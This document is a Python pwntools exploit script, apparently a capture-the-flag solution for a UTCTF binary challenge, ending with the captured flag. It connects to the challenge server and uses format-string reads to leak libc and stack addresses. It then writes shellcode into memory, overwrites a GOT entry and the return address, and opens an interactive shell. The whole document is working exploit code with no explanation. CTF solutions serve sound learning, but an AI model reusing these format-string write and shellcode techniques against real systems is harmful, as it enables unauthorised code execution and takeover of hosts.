from pwn import *
from formatstring import *

context(arch='amd64')

pwnable = ELF('./pwnable')
# libc = ELF('/usr/lib/libc.so.6')
libc = ELF('./libc-2.23.so')
# p = process('./pwnable')
p = remote('binary.utctf.live', 9003)

buf = b''
buf += b'%7$saaaa'
buf += p64(pwnable.got['fgets'])
p.sendline(buf)

buf = p.recv(1024)
buf = buf.split(b'\n')[4].split(b' ', 1)[0].split(b'aaaa', 1)[0]
fgets = u64(buf.ljust(8, b'\x00'))
libc_base = fgets - libc.symbols['fgets']

buf = b''
buf += b'%14$p'
p.sendline(buf)
buf = p.recv(1024)
buf = buf.split(b'\n')[0].split(b' ', 1)[0]
stack = int(buf, 16)
ret_addr = stack - 8

log.info(f'fgets at: {hex(fgets)}')
log.info(f'libc base at: {hex(libc_base)}')
log.info(f'return address at: {hex(ret_addr)}')

settings = PayloadSettings(offset=6, forbidden_bytes=b'\n', arch=x86_64)

def w(what, where):
    payload = WritePayload()
    payload[where] = what
    buf = payload.generate(settings)
    if b'\n' in buf:
        print('oooops')
    log.info(f'payload size: {len(buf)}')
    return buf

shellcode = asm(shellcraft.amd64.sh())
for i in range(0, len(shellcode), 2):
    what = shellcode[i:i+2]
    where = 0x601800 + i
    log.info(f'writing {what} to {hex(where)}')
    buf = w(what, where)
    p.sendline(buf)
    p.recv(1024)

# i have no clue why but there's a bloody null byte at this location
# even after the write, so writing it again
buf = w(b'\x2f', 0x601809)
p.sendline(buf)

buf = w(p16(0x1800), 0x601010)
p.sendline(buf)
buf = w(p16(0x0060), 0x601012)
p.sendline(buf)
buf = w(p16(0x0000), 0x601014)
p.sendline(buf)

buf = w(p16(0x0516), ret_addr)
p.sendline(buf)

input('...')

p.interactive()

'''
utflag{wtf_i_h4d_n0_buffer_overflows}
'''
